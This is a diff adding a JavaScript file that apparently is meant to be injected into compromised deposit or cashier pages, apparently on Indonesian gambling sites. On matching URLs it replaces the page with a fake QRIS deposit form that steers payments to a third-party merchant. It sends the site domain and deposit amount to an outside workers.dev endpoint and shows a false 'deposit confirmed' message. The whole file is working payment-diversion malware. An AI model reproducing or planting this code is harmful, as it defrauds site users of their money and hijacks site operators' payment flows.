@@ -1,0 +1,200 @@
+(function () {
+  const url = window.location.href;
+  const match = [
+    '/deposit',
+    '/bank',
+    '/deposit.php',
+    '/qris.php',
+    '/cashier',
+    '/?page=transaksi',
+    '/index.php?page=transaksi',
+    '/?deposit&head=home',
+    '/index.php?page=cashier',
+    '/bank.php'
+  ];
+
+  if (!match.some(path => url.includes(path))) {
+    return; // Stop jika URL tidak cocok
+  }
+
+  document.body.innerHTML = `
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background: #f5f5f5;
+        color: #333;
+        text-align: center;
+    }
+    .logo-container {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        background: white;
+        padding: 10px;
+        flex-wrap: wrap;
+    }
+    .logo-container img {
+        height: 40px;
+        object-fit: contain;
+    }
+    h2 {
+        margin: 15px 0 5px;
+        font-size: 20px;
+        font-weight: bold;
+    }
+    .marquee {
+        background: #ffeb3b;
+        padding: 5px;
+        font-size: 14px;
+        overflow: hidden;
+        white-space: nowrap;
+        box-sizing: border-box;
+    }
+    .qris-container {
+        background: white;
+        margin: 15px auto;
+        padding: 15px;
+        border-radius: 10px;
+        box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+        max-width: 350px;
+    }
+    .qris-container img {
+        width: 100%;
+        border: 3px solid #ddd;
+        border-radius: 8px;
+    }
+    .btn {
+        display: inline-block;
+        background: #2196f3;
+        color: white;
+        padding: 10px 15px;
+        margin-top: 10px;
+        border-radius: 5px;
+        text-decoration: none;
+        font-weight: bold;
+        cursor: pointer;
+        border: none;
+    }
+    input[type="number"] {
+        width: 90%;
+        padding: 8px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        font-size: 16px;
+        text-align: center;
+    }
+    .hint {
+        font-size: 14px;
+        color: #555;
+    }
+    footer {
+        font-size: 12px;
+        color: #777;
+        margin-top: 20px;
+        padding: 10px;
+    }
+    footer img {
+        width: 100%;
+        margin-top: 10px;
+    }
+    .loading-overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.5);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-size: 18px;
+        flex-direction: column;
+    }
+    .spinner {
+        border: 4px solid rgba(255,255,255,0.3);
+        border-top: 4px solid white;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 10px;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+
+<div class="logo-container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVSblEcy3PF2cQBNrKu5SPL4Ieo5R-yKAFIg-to270g7p3Oe_IFzTIIjs&s=10" alt="Logo 1">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUUdzifwHXkynArCuvWgH2up4Zn3R2GZGh1-a17IiOlrM1d_fzjVo5-i0K&s=10" alt="Logo 2">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6DvE1kGazNCdFI6W7RII0RUGBCrbuKvo2G0mpeI9Y3O0baWeKj0RUtsAi&s=10" alt="Logo 3">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRFAMSzwjc-8wFuDlA-Y-gwDr1j9qxJhZFzIg&s" alt="Logo 4">
+</div>
+
+<h2>DEPOSIT INSTANT QRIS</h2>
+
+<div class="marquee">
+    <marquee>Deposit instant dan praktis menggunakan Qris, Cepat, mudah, tanpa biaya tambahan, Deposit wajib menggunakan Kode unik 887, Contoh : 50.887, Pastikan Tujuan Deposit Qris Atas Nama Merchant Inggar Store</marquee>
+</div>
+
+<div class="qris-container">
+    <img id="qrisImg" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS">
+    <br>
+    <a class="btn" href="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" download>Download QRIS</a>
+</div>
+
+<input type="number" id="nominal" placeholder="Masukkan Nominal" min="50" oninput="updateHint()">
+<div class="hint" id="hintText">Hint: -</div>
+
+<div>
+    <button class="btn" onclick="konfirmasi()">Konfirmasi</button>
+</div>
+
+<footer>
+    © 2015 - 2025 Copyright QRID. All Rights Reserved
+    <img src="https://img.viva88athenae.com/guidelines_w.png" alt="Footer Image">
+</footer>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    Mengirim data...
+</div>
+`;
+
+  window.updateHint = function () {
+    let val = document.getElementById('nominal').value;
+    let hintText = document.getElementById('hintText');
+    if (val && !isNaN(val)) {
+        let total = parseInt(val) * 1000;
+        hintText.innerText = "Hint: " + total.toLocaleString('id-ID');
+    } else {
+        hintText.innerText = "Hint: -";
+    }
+  }
+
+  window.konfirmasi = function () {
+    let val = document.getElementById('nominal').value;
+    if (val < 50 || !val) {
+        alert("Nominal minimal 50");
+        return;
+    }
+    let total = parseInt(val) * 1000;
+    let hint = total.toLocaleString('id-ID');
+    let domain = document.domain;
+    let message = encodeURIComponent(domain + " - " + hint);
+
+    let img = new Image();
+    img.src = `https://memek-worker.defoy89122.workers.dev/?message=${message}`;
+
+    document.getElementById('loadingOverlay').style.display = 'flex';
+
+    setTimeout(function() {
+        alert("Deposit Berhasil Di konfirmasi, Silahkan Menunggu persetujuan");
+        window.location.href = "../";
+    }, 1500);
+  }
+})();
